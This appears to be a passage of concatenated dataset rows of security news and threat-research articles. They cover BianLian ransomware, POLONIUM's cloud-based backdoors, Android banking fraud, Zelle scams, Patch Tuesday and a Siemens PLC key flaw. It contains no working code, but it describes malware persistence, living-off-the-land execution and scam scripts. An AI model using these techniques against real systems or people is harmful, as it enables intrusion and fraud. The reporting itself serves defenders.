'' was recently disclosed by Talos. Alchimist also comprises a single-file based, ready-to-go C2 tool along with its remote access tool Insekt, implemented in GoLang and compiled to target Windows and Linux machines. The functionality of Manjusaka and Alchimist's web interfaces exhibiting remote administration capabilities, performed through the RATs, signifies the plethora of functionalities packed into these C2 frameworks. A threat actor gaining privileged shell access on a victim's machine is like having a Swiss Army knife, enabling the execution of arbitrary commands or shellcodes in the victim's environment, resulting in significant effects on the target organization. Endpoint security teams should implement layered security defense, be constantly vigilant in monitoring the privileged operations in their environments and detect any unauthorized programs attempting to gain root privileges. Network security teams should be looking for any unusual traffic to their organizations' environment and be cautious about suspicious artifacts downloaded to their network. Having controlled download and file execution policies on the endpoints and servers can effectively protect organizational assets from threats. Organizations and users who are using the vulnerable versions of polkits pkexec utilities should patch their systems following the mitigation steps as advised by RedHat . For the users of Unix-like systems other than Linux, who cannot find patches for their operating systems, a workaround could be implemented by removing the SUID-bit of pkexec utility.

Welcome to this week’s edition of the Threat Source newsletter. October is National Cybersecurity Awareness Month. Which, if you’ve been on social media at all the past 13 days or read any cybersecurity news website, you surely know already. As it does every year, I saw Cybersecurity Awareness Month kick off with a lot of snark and memes of people joking about what it even means to be “aware” of cybersecurity and why we even have this month at all. And I get why it’s easy to poke fun at, it is at its core a marketing-driven campaign, and hardcore security experts and researchers have notoriously pushed back against this being a marketing-driven field. I’m not saying there should be Cybersecurity Awareness Month mascots brought to life on the floor of Black Hat, but it is probably time to pump the brakes on the skepticism and snark. After all, this week should be about broadening the security community, not trying to exclude others from it. I came to Talos almost five years ago at this point knowing little to nothing about security. I had written about everything from ballet dancing to local government ordinances and zoning laws in my previous field, but the second someone mentioned a “container” in relation to computers I could only picture the big metal ones on the decks of freighter boats. The only reason I’ve made it to this point in my career is the support of my employer and co-workers, and their openness to these kinds of conversations. And even five years into the field, I still have so much more to learn. But an easy way for me to digest security is through these high-level conversations, memes, “awareness” stories and “explain like I’m five” questions. My sister-in-law recently had her Instagram account hacked by some bitcoin-mining operation to the point she just had to cut her losses and create a new account. Before that, she didn’t know that enabling multi-factor authentication in Instagram was even an option. Or that because her one password had been compromised on one site meant an attacker might try that same password on another site with an easy-to-guess email address. My wife never thought to check the “To” field of her emails if she thinks the Post Office is actually holding a package from her before realizing the link is from “ussps.zone” or something. In those cases, they quite literally are not aware of the security risks in these cases, it’s not that they were willingly ignoring it. That’s why I think National Cybersecurity Awareness Month is still important. It’s not for the security practitioners who have been following the same group of 100 people for the past 10 years, it’s for the public who does need to become more aware of the current cybersecurity risks that are out there. It's probably worth putting the jokes aside for a week or two just to take the time to tell someone about why they shouldn’t just click on any link that’s texted to them from a number with the same area code as them. That’s how I learned, and that’s how a lot of my colleagues have learned — just asking questions (some of them that may seem dumb at first). If you want to make it easier to start a conversation with any of your friends and family this October about security, any of the resources on Cisco’s NCSAM page are a great place to start. The one big thing Microsoft released its monthly security update Tuesday , disclosing 83 vulnerabilities across the company’s hardware and software line, including seven critical issues in Windows’ point-to-point tunneling protocol. October's security update features 11 critical vulnerabilities, with the remainder being “important.” Why do I care? Many of the critical vulnerabilities included in this month’s security release could lead to remote code execution, which is usually the worst of the worst when it comes to vulnerabilities. One of the most notable vulnerabilities Microsoft fixed this month is CVE-2022-41038 , a remote code execution issue in Microsoft SharePoint. There are several other SharePoint vulnerabilities included in this month’s Patch Tuesday, though this seems the most severe, as Microsoft continues it to be “more likely” to be exploited. So now what? Patch all your Microsoft hardware and software as soon as possible in accordance with the guidance the company provides on its update page . Talos has also released several Snort rules to protect against the exploitation of many of these vulnerabilities. Top security headlines from the week The Killnet Russian state-sponsored threat actor took credit for several high-profile cyber attacks this week, including the disruption of websites belonging to major American airports and state governments. The group posted on Telegram that it was behind a distributed denial-of-service attack on several airports’ sites, including Los Angeles International, Chicago O'Hare and Hartsfield-Jackson International in Atlanta, some of the largest in the U.S. However, no flight operations were disrupted. Prior to that, they also carried out DDoS attacks against state government-run websites in Colorado, Connecticut, Kentucky and Mississippi, including local election committees. Killnet also took responsibility for disrupting bank JP Morgan’s infrastructure, though the bank denied it experienced any negative effects from the attack. ( NPR , SC Magazine , StateScoop ) Microsoft updated its mitigations for the so-called “ProxyNotShell” zero-day vulnerabilities in Exchange Server after security researchers found the initial recommendations could be bypassed. However, there was no formal patch for the issues in this week’s Patch Tuesday as some had expected. An attacker could exploit the flaws to achieve remote code execution on the underlying server. Microsoft also says it's investigating a possibly different vulnerability in Exchange Server that’s being exploited in the wild, though they aren’t ruling out that the new report could be connected to ProxyNotShell. ( The Hacker News , The Register , The Record ) Facebook warned more than a million users that their login credentials could have been stolen if they downloaded one of 400 malicious apps on the Google Play and Apple app stores. The malicious apps disguised themselves as mobile games, photo editing or fitness tracking apps, among others, according to Facebook. Users who may have logged into Facebook through the malicious app could have had their information stolen. Facebook has already notified the users affected, warning them to enable two-factor authentication on their accounts and change their passwords. Forty-seven of the apps existed on the Apple store, while the remainder were Android-based. ( CNET , Engadget ) Can’t get enough Talos?

BianLian ransomware raises the cybercriminal bar by encrypting files with exceptional speed. Threat actors built the new BianLian ransomware in the Go programming language (aka Golang). Despite the large size of files created in Go, threat actors are turning to this “exotic” programming language more often for a variety of reasons, particularly its robust support for concurrency. This is the ability for various malicious functions to run independently of each other, which speeds up the attack. In addition to an overview of the BianLian ransomware, this post also highlights some of the unique aspects of Golang that makes it an increasingly popular choice for malware authors. Operating System Risk & Impact What is BianLian? Bian Lian is an ancient dramatic art that originates in China. Artists move about the stage in brightly colored outfits and colored masks. The performers are so quick to change the masks that, with the swipe of a fan or the blink of an eye, their costume’s face completely changes. We can now add a new meaning to the term “Bian Lian,” because a ransomware group took the name and made it their own. Research from Cyble found that this threat group targets many different industry sectors. Their targets have historically included manufacturing, education, healthcare, professional services, energy, banking, financial services, and insurance (BFSI), and the entertainment industry. As of September 20, 2022, the group’s leak site includes 23 victims. BlackBerry researchers analyzed the list of victims and determined that this group targets corporations rather than specific countries. The listed victims have varied origins, including the United States, Australia, and the United Kingdom. Why do these operators target English-speaking countries? It’s likely the threat actor is financially motivated rather than politically or geographically orientated. And at this point, the group has not claimed any affiliation with any nation state or agenda. BianLian ransomware shares its name with a malicious Android package (APK) application that was previously hosted on the Google Play™ store, but it has since been removed. This malicious application was also dubbed “BianLian” by ThreatFabric . This identically named malware used a dropper from the Google Play store to install a malicious file from the infamous Anubis Banker Trojan. From there, the threat actor would use a messaging service to deliver command-and-control (C2) commands and steal user credentials. At the time of writing, no one has claimed any relation between these two malware families aside from the name they’ve been given. Go For Speed in Malware BianLian ransomware is written in Golang. As we discussed in a recent whitepaper , Golang is an open-source programming language designed by Google employees. The language’s official first release was in March 2012, and it quickly became a mainstay language for large industry organizations such as Apple, Google, and IBM. Golang comes with a large standard library, garbage collection cleanup, and concurrency support. Concurrency means that multiple computations can take place at the same time through a process called multithreading. To enable this, Go uses “ Goroutines "", which allow for asynchronous execution of functions or methods independently from each other. This concurrency allows for quicker encryption of the target system. Go can compile code for Windows®, Linux®, and OS X®. This feature makes it possible for malware authors to create threats that impact all the major operating systems, if they choose to. Go libraries are statically linked, which means all the necessary libraries are included in the compiled binary. In languages where this is not the case, developers will either include the libraries separately from the main executable, or they will have to hope that the target machine has the needed libraries already installed on their machine. Including these libraries makes for a larger file that is harder to distribute, but larger files might also be ignored by antivirus (AV) engines that are trying to optimize for speed. Technical Analysis of BianLian Ransomware The sample we will be analyzing in this post is named anabolic.exe (SHA256: 46d340eaf6b78207e24b6011422f1a5b4a566e493d72365c6a1cace11c36b28b). This file is a 64-bit executable compiled with Golang version 1.18.3. When a Golang program is built, it generates a BuildID. A BuildID in Golang is a unique representation of the file and its contents. The BuildID is in the first 32 kb of the binary file, though the exact position can vary depending on the operating system it’s compiled for. The file in focus here is a portable executable (PE) file. Looking closer, a BuildID is comprised of a hash of the filenames and the contents of the application, and it is segmented into two parts: actionID and ContentID. The actionID is a hash of the inputs that produced the packages or binary, and the contentID is the hash of the action output. This action output is the binary itself. The buildID of anabolic.exe is shown below in Figure 1. Figure 1: Build ID from 46d340eaf6b78207e24b6011422f1a5b4a566e493d72365c6a1cace11c36b28b The command used to compile the program is also stored in the binary. To compile a program with Go, you use the “Go build” command. This command compiles all the packages and dependencies necessary for the application. For the sample we’re analyzing in this blog, this build path was given two arguments, shown below in Figure 2. The argument commands given are gcflags and trimpath . -Gcflags relates to flags passed to the compiler, and -trimpath removes all absolute file system paths from the executable. This is an attempt to remove user path directories. It’s useful to note the last part of the path here: “crypt22.” This can mark iterations of development from the actor, as this number has changed between samples in the wild. Figure 2: Crypt project path The author packaged all the ransomware's functionalities into a common package. A package is a collection of source files in the same directory that are compiled together. Static analysis of the strings in pestudio provides us with an idea of what the sample’s capabilities are. From this information, we can see it will likely rename files, and it can also chunk files into smaller blocks for processing, query drive information, and check file extensions. Project pathing for this functionality is shown in Figure 3. Figure 3. Common package functions Upon execution of the file, the application searches the host machine for all possible drive names. To do this, the ransomware uses GetDriveTypeW from the kernell32 library. This functionality is accessed via the GetProcAddress API call, which retrieves the address of the function. The purpose of this action is to ensure that the ransomware can encrypt all connected or potential media. The call starts from “A:\\” and checks all the way to “Z:\\.” Debugger output demonstrating a snippet of this activity is shown in Figure 4. Figure 4. GetDriveTypeW call with drives Once all the drives are populated, the threat begins its ransom process. The ransomware encrypts files using the standard library crypto package in Go. These packages are open-source libraries used to provide cryptographic functionality, like the base CryptoAPI provided in Windows environments. BianLian Ransomware Note and Demands The ransomware drops a .TXT file into the directory where the file was run, named “Look at this instruction.txt.” The ransom note is shown in its entirety in Figure 5. This text file contains information regarding how to contact the threat actor to restore your data. To contact the threat actors, victims can either download the peer-to-peer encrypted chat service application Tox messenger, or they can email the group directly. The threat actor gives their victims 10 days before publicly releasing their stolen data on the operator’s “.onion” site. The note does not indicate how much money the threat actors want for payment. Figure 5. BianLian ransom note From here, this process is repeated in multiple threads to ensure a speedy encryption. The ransomware targets any drive found on the system, including mounted drives, and encrypts anything that is not an executable, driver, or text file. These exclusions are meant to avoid encrypting either the ransom note, or anything that might cause the system to malfunction. The excluded files types are located within their directories by using FindFirstFileW and FindNextFileW . The lpFindFileData return value holds the information on the directory found, and FindNextFileW is used to step through the files returned with FindFirstFileW. The files are cut into small chunks and the encryption is multithreaded to increase the speed of this operation. Figure 6 shows a snapshot of the read/write execution steps the ransomware takes to encrypt the files on the system. The output shows the read/write length of the buffer at 16 bytes, which is kept consistent throughout the execution of the file. After encryption, filenames are appended with a “.bianlian” extension and closed. Figure 6. Ransomware read/write procmon We did not observe any network interaction in this sample. This means the threat actor could have deployed the sample directly on the system with remote access. As highlighted by cybersecurity services firm called [redacted] , it is likely the BianLian threat group’s initial access is gained via the ProxyShell vulnerability chain or a SonicWall VPN firmware vulnerability. From here, the threat actor moves laterally to find targets of interest, escalates their privileges, and deploys the BianLian ransomware. Then, using dropped copies of WinSCP and 7-Zip to archive and transfer chosen files, data is extracted and sent back to the threat actor. Additionally, threat operators might install backdoors on the systems to maintain access to the infected system. Conclusion BianLian is a relatively new threat actor that targets a wide range of industries. As they are likely financially motivated, they will continue their efforts to exploit systems and networks they gain access to. Their Golang-based ransomware utilizes goroutines and encrypts files in chunks to quickly ransom an infected system. The threat actor targets multiple industries in multiple countries. Their deployment method is manual infiltration of the system, and they use living-off-the-land (LotL) binaries to explore the networks and systems themselves. Once they find all the information they want, they deploy their ransomware. Who is Targeted by BianLian Ransomware? To date, this ransomware group has targeted the following industries: professional services, manufacturing, healthcare, energy, media, banks, and education sectors. Their targets thus far reside in the United States, Australia, and the United Kingdom. There is no indication that they are necessarily limited to these industries or countries. Mitigation Tips File Carving ( D3-FC ) – Use the file carving technique to examine files sent over the network. File Access Pattern Analysis ( D3-FAPA ) – Identify the way an application accesses files; target could be the multiple read/writes on files that ransomware employs. Remote Terminal Session Detection ( D3-RTSD ) – Detect unauthored remote sessions through network traffic. File Creation Analysis ( D3-FCA ) – Ransomware creates ransom notes; this behavior can be detected.

Here’s how to keep your money safe while using the popular P2P payment service. The consumer payments space has undergone a radical shift in recent years. A new breed of apps, including Venmo, Cash App and Zelle, now offer a fast, effective and free way for users to pay friends, family and selected small businesses. Launched in 2017 by a US banking consortium, Zelle is one of the most successful of these peer-to-peer (P2P) services, becoming by far the largest provider of its kind in the US by total payments sent: $490 billion in 2021. Some 10,000 financial institutions now participate in its network, meaning Zelle can be accessed from countless banking apps, as well as downloaded as a standalone service. But although it’s generally considered to be a secure way to transfer funds, it has been criticized for offering little consumer protection from scams. Indeed, just days ago, Zelle came under fire in a US Senate report , which stated that Zelle users lost some $440 million through fraudulent transactions in 2021. According to the report, banks are doing little to combat fraud and scams on Zelle and are generally reluctant to refund people who have fallen victim to con artists. Couple these figures with the fact that incidents of fraud on Zelle are trending upwards and it’s clear that you should be on the lookout for tricksters who take advantage of others’ trust for their own gain and leave victims high and dry. There’s a lengthy list of tactics that fraudsters use to trick victims into sending them money. Here are the main ones to watch out for: A scammer impersonates a family member or close friend, urgently requesting some funds to help them with an emergency. Or they may pretend to be a representative from a government agency, bank, utility or similar, demanding funds to cover a late payment or fine. Either way, once the money is sent, they disappear. Facebook Marketplace is a magnet for Zelle scams. In one classic ploy, also used to extract money via Cash App and other services, a buyer sends a fake check to a seller for an amount exceeding the sale price of an item. They’ll then ask the seller to refund the overpayment via Zelle. If the latter does, they’ll lose that money before realizing the check itself is not legitimate. In another Facebook Marketplace scam, a buyer expresses interest in a product and asserts they will pay by Zelle. They then send the victim a fake email claiming a payment is pending, but that the buyer is using a business account which they have had to pay extra for. It requests the seller pay that fee back to the buyer in order for the initial payment to go through. However, the whole thing is a lie, and the seller ends up down whatever they paid the buyer in ‘fees.’ A new interesting scam I just experienced on Facebook Marketplace. Buyers asking to pay via Zelle and then telling you to check your email for confirmation. The email says the payment is on hold until you upgrade to a business account by sending some amount back first. 1/2 pic.twitter.com/MiBrLhHdvO — Chandler Kellogg (@cpkellogg98) September 27, 2022 Online buyers beware: scammers are all over e-commerce and various social media sites, offering to sell in-demand items priced extremely low but for a limited period only. This pressure often causes the buyer to abandon their usual caution online. They pay by Zelle and the item never arrives. To help highlight the risks of purchasing red-hot products on social media , ESET Chief Security Evangelist Tony Anscombe recently engaged in a conversation with a verified (though apparently hacked) Twitter account that claimed to sell PlayStation 5 consoles and requested payment via Zelle. Conversation with a scammer (click to enlarge) Romance scammers are past masters at social engineering: the art of the con. They’ll build up a strong rapport with their victim online, befriending them initially on dating sites. Once their mark has been sucked in, they’ll start to request money: for medical bills, air tickets and more. If sent by Zelle, there’s near-zero chance the victim will ever see that money again. The victim receives a legitimate-looking message or email from a company they do business with, requesting they click a link to review an invoice. Doing so will take them to a phishing page spoofed to appear like that business’s website, where they’ll be asked to enter personal details. Once in the scammer’s hands, these details will enable a takeover of the victim’s Zelle account. This works similar to the fake invoice scam, except the victim receives a communication telling them they’ve won some kind of prize and need only click a link to receive the winnings. Doing so will take them to a fake site encouraging them to enter their personal details again. There are numerous variations of these two scams, all resulting in account takeover . Phishing emails and texts can also lead to covert malware downloads, if the user is tricked into clicking on a malicious link. This effectively cuts out the stage where they enter their personal details. Instead, the malware might either steal logins or automatically hijack the Zelle account and transfer funds out. A user receives a test from their ‘bank’ asking if they are attempting to transfer funds. If they reply, a scammer will call them, pretending to work for the bank. They will then run the victim through a list of instructions which they say will help to reverse the fraudulent transaction. In fact, it initiates a money transfer to the criminals. 1/4 There has been a scam going around related to Zelle. ""Pay Yourself"" scam, I think they're calling it, if you want to look it up. Here are a couple very helpful tips related to anything you use, or do. #Cardano friends, and everyone. Is @everyone a tag? Heh. pic.twitter.com/5HTujGqIcW — holymacaroni | Going to Rare Bloom (@holymacaronee) September 25, 2022 When an individual falls victim to a Zelle or other online scam, their details are often saved on file for follow-on fraud. Here, a scammer might call up pretending to work for an agency which can get their lost funds back. All the victim has to do is pay an upfront fee. Sadly, they will never get this money back either. RELATED READING: Mobile payment apps: How to stay safe when paying with your phone Zelle doesn’t require users to share any financial information in order to send funds, and individuals are usually authenticated via their bank, adding an important layer of security. However, much like Cash App and similar services, it doesn’t offer the same protections as credit and debit cards. Zelle itself distinguishes between “fraud” – when an unauthorized third-party accesses a user’s account and transfers money out without the user’s knowledge – and “scams” where the user is tricked into sending the money themselves. In the case of the latter, there’s little chance they will get the defrauded funds back. Indeed, according to the aforementioned report, banks don’t repay 90% of cases in which people were duped into making payments on the platform. The tips for staying scam-free on Zelle are not dissimilar to those for avoiding fraud on Cash App and other P2P payment services. It involves being cautious of any unsolicited communication, improving account authentication and only sending money to people you trust. Consider the following: The bottom line is, “if you don’t know a person or aren’t sure you’ll get what you paid for, using your credit card may be a better payment option” – that’s according to Zelle itself. If there’s even a sliver of doubt in your mind, make sure online payments are made via methods which offer greater cardholder protection.",['Scams'],8c959e8d-1718-5d76-8aa5-0d59a7ba7c0f,"Fraudsters use various tactics to separate people from their hard-earned cash on Zelle, here’s how to keep your money safe while using the popular P2P payment service.

Critical remote code execution vulnerabilities are found in its Office productivity suite, and in the Windows point-to-point tunnelling protocol (PPTP) which contains seven serious bugs that require attackers to exploit and win a race condition. Several other remote code execution and privilege elevation vulnerabilities are fixed in the Patch Wednesday updates, including one affecting the Active Directory Certificate Services which is rated as critical. Eleven vulnerabilities affect Microsoft's Chromium-based Edge web browser, but these are not rated, the SANS Internet Storm Centre noted . An Exchange Server vulnerability that can be exploited by authenticated users is not patched this month; instead, Microsoft recommends rule-based attack blocking to mitigate this. Of the 13 critical-rated vulnerabilities, the Common Vulnerabilities and Exposures 2022-41033 bug affecting the Windows COM+ component services management system is being exploited in the wild currently. Microsoft rates the system service elevation of privilege vulnerability as a 7.8 out of 10 on the Common Vulnerabilities Scoring System version 3.1. Another privilege escalation vulnerability affecting Azure Arc-enabled Kubernetes cluster Connect has the full CVSS 3.1 rating of 10.0; it could allow an attacker to become an admin, and gain full control over the Kubernetes cluster. But Rapid7 product manager Greg Wiseman questioned why the CVE-2022-37968 vulnerability was scored as a full 10.0, given that it's difficult to exploit. ""It's unclear why Microsoft assigned such a high score, given that an attacker would need to know the randomly generated external DNS [domain name system] endpoint for an Azure Arc-enabled Kubernetes cluster, arguably making the attack complexity high,"" Wiseman said.

""An attacker can use these keys to perform multiple advanced attacks against Siemens SIMATIC devices and the related TIA Portal , while bypassing all four of its access level protections ,"" industrial cybersecurity company Claroty said in a new report. ""A malicious actor could use this secret information to compromise the entire SIMATIC S7-1200/1500 product line in an irreparable way."" The critical vulnerability, assigned the identifier CVE-2022-38465 , is rated 9.3 on the CVSS scoring scale and has been addressed by Siemens as part of security updates issued on October 11, 2022. The list of impacted products and versions is below - Claroty said it was able to get read and write privileges to the controller by exploiting a previously disclosed flaw in Siemens PLCs ( CVE-2020-15782 ), allowing for the recovery of the private key. Doing so would not only permit an attacker to circumvent access controls and override native code, but also obtain full control over every PLC per affected Siemens product line. CVE-2022-38465 mirrors another severe shortcoming that was identified in Rockwell Automation PLCs (CVE-2021-22681) last year and which could have enabled an adversary to remotely connect to the controller, and upload malicious code, download information from the PLC, or install new firmware. ""The vulnerability lies in the fact that Studio 5000 Logix Designer software may allow a secret cryptographic key to be discovered,"" Claroty noted in February 2021. As workarounds and mitigations, Siemens is recommending customers to use legacy PG/PC and HMI communications only in trusted network environments and secure access to TIA Portal and CPU to prevent unauthorized connections. The German industrial manufacturing company has also taken the step of encrypting the communications between engineering stations, PLCs and HMI panels with Transport Layer Security (TLS) in TIA Portal version 17, while warning that the ""likelihood of malicious actors misusing the global private key as increasing."" The findings are the latest in a series of major flaws that have been discovered in software used in industrial networks. Earlier this June, Claroty detailed over a dozen issues in Siemens SINEC network management system (NMS) that could be abused to gain remote code execution capabilities.

To confront this, organizations and solutions providers alike are embracing Authentication, Authorization, and Accounting (AAA) standards such as OpenID Connect (OIDC) / Security Assertion Markup Language (SAML) standards. To promote access security and stronger identity management, administrators must be cognizant of two important authentication snares: User credentials caching by a browser (automatic or user-initiated) Application of Single Sign On (SSO) to web-based access or identify authentication These authentication loopholes come with the danger of not fully authenticating user identity, often without even a two-factor authentication (2FA) request. Today’s authentication tools must support a mode of user identity validation that enforces full user reauthentication, regardless of SSO settings or browser caching, while protecting the session from end to end. Session Management A session is created by an application server to track the state of authenticated users and visitors. Sessions include an area of memory or storage on the server, and a session ID to refer to that server-side session. These random, unique, and hard-to-guess strings are valid for a finite period. They are used by the application server on any subsequent request to verify the identity of the sender. In many cases, given that session management is usually handled by the web framework, it is transparent to whoever knows how to look for it. The session ID is often all that is needed to prove authentication for the rest of the session. As such, this session ID must be protected. Strong session defense is achieved by adhering to OIDC/SAML standards. All session validation occurs with JSON Web Token (JWT) access and bearer tokens with required grants. Continuous authentication is reinforced with policy-controlled multifactor authentication (MFA). A compliant Zero Trust Network Access (ZTNA) tool that prioritizes session management integrated with a reliable MFA tool promotes strong session defense. Continuous Authentication A key tenet of zero trust is to enforce users to reauthenticate and assert their identities under certain conditions. The conditions can be indicators of compromises that can lead to a wide array of attacks. Continuous assessment of risk posture and forcing users to reauthenticate can bolster ZTNA. This helps to ensure that if a user who was authenticated at one time is later compromised, the repercussions of the compromise are mitigated before any malicious activity can occur. NIST Best Practices As part of the global mission to usher in a new era of network access through ZTNA, the National Institute of Standards and Technology (NIST) has issued a set of common best practices to plan and implement a zero-trust architecture. These tenets of zero trust include: All resource authentication and authorization are dynamic and strictly enforced before access is allowed. All data sources and computing services are considered resources. The enterprise monitors and measures the integrity and security posture of all owned and associated resources. All communication is secured regardless of network location. Access to individual resources is granted on a per-session basis. Access to resources is determined by dynamic policy – including the observable state of client identify, application/service, and the requesting asset – and may include other behavioral environmental attributes. The enterprise collects as much information as possible about the current state of assets, network infrastructure, and communications and uses it to improve its security posture. Moving to a zero-trust architecture is no small undertaking. It will involve a series of upgrades and changes over time. With these tenants of zero trust at the forefront of any transition to zero trust, administrators will be well-positioned to successfully lead their organizations through the next generation of network access. CylanceGATEWAY: A ZTNA Solution to Authentication and Session Management The CylanceGATEWAY® solution integrates with authentication tools to meet modern ZTNA needs. The CylanceGATEWAY Tunnel Reauthentication policy, working in tandem with authentication tools, helps to ensure reauthentication reoccurs frequently, regardless of the user’s SSO settings or browser caching. This policy keeps private resources secure by protecting against session hijacking. Simultaneously, source IP pinning and associated restrictions to accessing private applications act as a deterrent to prevent cookie hijacking. When empowered with an authentication tool that has strong adherence to OIDC/SAML standards, administrators can feel confident in the security that the tool offers when combined with CylanceGATEWAY. Ideally, session validation occurs with JWT access and bearer tokens with required grants. This includes MFA-based continuous authorization that is policy controlled. This marriage is the essence of the CylanceGATEWAY solution, and an authentication integration that provides true zero-trust network access. CylanceGATEWAY integrates with BlackBerry® Enterprise Identity services to broker authentication with any identity provider (IDP). Organizations without an IDP are natively supported through the BlackBerry Enterprise Identity services. The right tools, working together, configured with the right policies enable a connected and protected world.

The Dutch mobile security company said it identified a network of phishing websites targeting Italian online-banking users that are designed to get hold of their contact details. Telephone-oriented attack delivery (TOAD), as the social engineering technique is called, involves calling the victims using previously collected information from the fraudulent websites. The caller, who purports to be a support agent for the bank, instructs the individual on the other end of the call to install a security app and grant it extensive permissions, when, in reality, it's malicious software intended to gain remote access or conduct financial fraud. In this case, it leads to the deployment of an Android malware dubbed Copybara , a mobile trojan first detected in November 2021 and is primarily used to perform on-device fraud via overlay attacks targeting Italian users. Copybara has also been confused with another malware family known as BRATA . ThreatFabric assessed the TOAD-based campaigns to have commenced around the same time, indicating that the activity has been ongoing for nearly a year. Like any other Android-based malware, Copybara's RAT capabilities are powered by abusing the operating system's accessibility services API to gather sensitive information and even uninstall the downloader app to reduce its forensic footprint. What's more, the infrastructure utilized by the threat actor has been found to deliver a second malware named SMS Spy that enables the adversary to gain access to all incoming SMS messages and intercept one-time passwords (OTPs) sent by banks. The new wave of hybrid fraud attacks presents a new dimension for scammers to mount convincing Android malware campaigns that have otherwise relied on traditional methods such as Google Play Store droppers, rogue ads, and smishing. ""Such attacks require more resources on [threat actors'] side and are more sophisticated to perform and maintain,"" ThreatFabric's Mobile Threat Intelligence (MTI) team told The Hacker News. ""We also like to point out that targeted attacks from a fraud success perspective are unfortunately more successful, at least in this specific campaign."" This is not the first time TOAD tactics are being employed to orchestrate banking malware campaigns. Last month, the MalwareHunterTeam detailed a similar attack aimed at customers of Axis Bank, an India-based bank, in a bid to install an info-stealer that impersonates a credit card rewards app. ""Any suspicious call should be double checked by calling your financial organization,"" the MTI team said, adding ""financial organizations should provide their customers with knowledge about ongoing campaigns and enhance the client apps with mechanisms to detect suspicious activity.""",['Malware'],e2250a4f-5734-5f59-9761-4f46d35b50e7,"Telephone-oriented attack delivery (TOAD), as the social engineering technique is called, involves calling the victims using previously collected information from the fraudulent websites.

POLONIUM is a cyberespionage group first documented by Microsoft Threat Intelligence Center (MSTIC) in June 2022. MSTIC’s assessment is that POLONIUM is an operational group based in Lebanon, coordinating its activities with other actors affiliated with Iran’s Ministry of Intelligence and Security (MOIS). According to ESET telemetry, POLONIUM has targeted more than a dozen organizations in Israel since at least September 2021, with the group’s most recent actions being observed in September 2022. Verticals targeted by this group include engineering, information technology, law, communications, branding and marketing, media, insurance, and social services. Our findings describing the tactics of this group, including details about a number of previously undocumented backdoors, were presented in late September at the Virus Bulletin 2022 conference. The numerous versions and changes POLONIUM introduced into its custom tools show a continuous and long-term effort to spy on the group’s targets. While we haven’t observed what commands were executed by operators on compromised machines, we can infer from their toolset that they are interested in collecting confidential data from their targets. The group doesn’t seem to engage in any sabotage or ransomware actions. As shown in Figure 1, POLONIUM’s toolset consists of seven custom backdoors: CreepyDrive, which abuses OneDrive and Dropbox cloud services for C&C; CreepySnail, which executes commands received from the attackers’ own infrastructure; DeepCreep and MegaCreep, which make use of Dropbox and Mega file storage services respectively; and FlipCreep, TechnoCreep, and PapaCreep, which receive commands from attacker’s servers. The group has also used several custom modules to spy on its targets. Figure 1. Timeline of observed backdoors deployed by POLONIUM While we don’t know how the group gained initial access to the targeted systems, some of the victims’ Fortinet VPN account credentials were leaked in September 2021 and were made available online. As such, it is possible that the attackers gained access to the victims’ internal networks by abusing those leaked VPN credentials. POLONIUM is an active group that constantly introduces modifications to its custom tools. We have seen more than 10 different malicious modules since we started tracking the group, most of them with various versions or with minor changes for a given version. Some of the most interesting characteristics of the group’s toolset are: CreepyDrive is a PowerShell backdoor that reads and executes commands from a text file stored on OneDrive or Dropbox. It can upload or download files from attacker-controlled accounts in these cloud services, and execute supplied PowerShell code. Figure 2 shows part of the code that downloads files and executes commands. Note that this backdoor was documented in Microsoft’s report in June 2022. Figure 2. Code used by CreepyDrive to download files or execute commands CreepyDrive uses the OneDrive HTTP API (and the Dropbox HTTP API ) to access the cloud storage. In both cases it uses a refresh token, client ID, and client secret (all hardcoded) to generate an access token that authenticates the user and grants access to the accounts. While we didn’t observe commands being executed by the attackers on compromised systems, we spotted a log file documenting the execution of a command on a victimized computer. The contents of the log file (decoded) are shown in Figure 3. Figure 3. Execution log of a command and its output CreepySnail is another PowerShell backdoor that sends HTTP requests to a C&C server and receives and executes PowerShell commands. We saw various versions of this backdoor in the wild, though the differences between them were minimal. Figure 4 shows one version that can run any executable specified by the C&C server (as long as it’s in the malware folder). We won’t go into more details about this backdoor as it has already been described by Microsoft in their report. Figure 4. Code used by CreepySnail to execute commands DeepCreep is a previously undocumented backdoor written in C# that reads commands from a text file stored in Dropbox accounts and can upload or download files to and from those accounts. Some versions of DeepCreep have obfuscated strings, some separate the code into DLLs, and some have more or less commands. We will focus on the most prevalent version for this analysis, although interesting features of other versions will be mentioned. A command to be executed by the backdoor is read from the file cd.txt on the server-side root folder of the victim; once read, the file is deleted from the cloud. DeepCreep runs this process in an infinite loop, which means that a new cd.txt file has to be placed in the cloud storage for every command to execute. If the file is not found, the backdoor sleeps then tries again. A list of the commands that DeepCreep can process is shown in Table 1. Table 1. List of commands supported by DeepCreep DeepCreep persists by creating a LNK file in %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup and by creating a scheduled task. A PowerShell command is used to create the LNK file, as shown in Figure 5. Figure 5. Part of the code that DeepCreep uses to establish persistence Authentication with the cloud is done by using OAuth 2.0 tokens, which are hardcoded in the binaries. DeepCreep needs a legitimate DLL with Dropbox SDK to be able to communicate with the cloud. We saw some cases where a separate loader – WindowsTool.exe – was used to implement persistence and execute DeepCreep with InstallUtil , a legitimate tool from the .NET Framework. This version of the backdoor has its malicious code provided in an uninstallation routine and is executed with the /u (uninstall) option of InstallUtil.exe , perhaps to mislead defenders. Figure 6 shows part of the code of the loader. Figure 6. Part of the code of the loader that executes DeepCreep In terms of string obfuscation, we have seen two variations: ROT13 and AsStrongAsFuck obfuscator. The latest version of DeepCreep that we have seen uses AES encryption and has the same key commands as the MegaCreep backdoor, which we will describe in the next section. MegaCreep is a previously undocumented backdoor based on DeepCreep, with added functionalities. It reads and executes commands from a text file stored in Mega cloud storage. While MegaCreep is arguably just a newer version of DeepCreep, and in fact reuses code from DeepCreep, it seems the attackers consider both backdoors as separate projects. MegaCreep processes the same commands that we described for DeepCreep, but they are stored in AES-encrypted form in the file cd.txt . It has additional commands, both related to the key used for decryption, which are described in Table 2. Table 2. List of new commands added to MegaCreep MegaCreep checks for these commands first, which are stored unencrypted in cd.txt . If none of these commands are found, then the contents of cd.txt are decrypted using the key that is in Cert.dll . After decryption, all the same commands that we described for DeepCreep can be executed by MegaCreep. MegaCreep uses the MegaApiClient C# library to communicate with Mega cloud storage. Authentication is done with a username and password, which are stored encrypted in a local file, Sess.dll . Figure 7 shows the code that loads the username and password from Sess.dll . Figure 7. Code used in MegaCreep to load username and password This backdoor is a good example of the preference that POLONIUM has for using separate DLLs with specific functionality, as shown in Figure 8. In the example, two methods from PRLib.dll are called: CHP , which kills running processes with the same name as the backdoor’s executable 